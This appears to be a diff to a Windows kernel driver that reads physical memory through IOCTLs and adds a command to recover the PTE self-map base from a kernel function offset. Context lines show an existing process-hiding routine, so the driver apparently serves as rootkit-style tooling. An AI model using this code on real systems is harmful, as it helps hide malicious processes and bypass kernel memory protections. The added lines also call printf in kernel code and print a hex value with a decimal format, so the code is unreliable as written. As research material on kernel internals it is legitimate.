@@ -37,9 +37,14 @@ ULONG64 lastVaOffset = 0;
 ULONG64 largePageTableOffset = 0;
 ULONG64 largePageSizeOffset = 0;
 ULONG64 poolChunkSize = 0;
+ULONG64 MiGetPteAddressOffset = 0;
+
 
 // Handle to physical memory
 HANDLE physicalMemHandle = nullptr;
+
+// Offset of internal function, parsed from PDB in front end
+//ULONG64 MiGetPteAddress = 0;
 
 NTSTATUS
 DriverCreateClose(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
@@ -102,6 +107,7 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
             largePageTableOffset = offsetValues->largePageTableOffset;
             largePageSizeOffset  = offsetValues->largePageSizeOffset;
             poolChunkSize        = offsetValues->poolChunkSize;
+            MiGetPteAddressOffset      = offsetValues->functionMiGetPteAddressOffset;
             setup();
             break;
         case GET_KERNEL_BASE:
@@ -187,9 +193,9 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
                 }
                 RtlCopyMemory((PVOID)outputData, (BYTE*)mappedBuffer + page_offset, (SIZE_T)derefAddr->size);
                 //DbgPrint("[NAK] :: [ ] Content of paging structure: %llx from physical %llx\n", *(ULONGLONG*)outputData, derefAddr->addr);
-                ZwUnmapViewOfSection((HANDLE)-1, mappedBuffer);
-
+                ZwUnmapViewOfSection(ZwCurrentProcess(), mappedBuffer);
             }
+            //MmUnmapLockedPages(outputData, Irp->MdlAddress);
 
             // Method 4: using MmMapIoSpace, not working
             /*PHYSICAL_ADDRESS phys_address;
@@ -215,6 +221,20 @@ DriverControl(PDEVICE_OBJECT /* DriverObject */, PIRP Irp) {
             DbgPrint("[NAK] :: [ ] Hide process name: [%15s]; size: %llu\n", processHide->name, processHide->size);
             hideProcess(processHide->name, processHide->size);
             break;
+
+        case GET_PTE_BASE_ADDRESS:
+            // Get the base address (in virtual address) of the PTE self-mapping table
+            // DO NOT run this before the GET_KERNEL_BASE signal (since it depends of the kernel base)
+
+            ULONG64 pteBase;
+            inputData = (PINPUT_DATA)(Irp->AssociatedIrp.SystemBuffer);           
+            outputData = (POUTPUT_DATA)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
+            printf("Got the MiGetPteAddressOffset: 0x%lld", MiGetPteAddressOffset);
+            pteBase = *(ULONG64*)((ULONG64)ntosbase + MiGetPteAddressOffset + 0x13);
+            printf("Got the PTE base: 0x%p", pteBase);
+            outputData->ulong64Value = pteBase;
+            break;
+
         default:
             break;
     }
